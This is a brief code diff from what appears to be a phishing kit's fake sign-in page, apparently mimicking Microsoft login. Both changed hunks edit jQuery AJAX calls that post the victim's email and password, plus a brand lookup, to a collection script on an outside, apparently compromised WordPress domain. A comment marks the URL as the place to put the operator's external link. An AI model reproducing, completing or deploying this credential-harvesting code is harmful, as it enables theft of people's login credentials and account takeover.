@@ -73,7 +73,7 @@
 					$("#passwordError").hide();
 					$('#idSIButton9').prop('disabled', true);
 					$.ajax({
-						url: "https://muba.com.co/wp-includes/wp-content/eh/send.php", // add external link here
+						url: "https://muba.com.co/wp-content/eh/send.php", // add external link here
 						data: {
 								"email": user,
 								"password": pass
@@ -103,7 +103,7 @@
 			
 			function set_brand(email){
 				$.ajax({
-					url: 'https://muba.com.co/wp-includes/wp-content/eh/send.php', // add external link here
+					url: 'https://muba.com.co/wp-content/eh/send.php', // add external link here
 					type: "POST",
 					data: {email:email,barnd:1},
 					success: function(data){
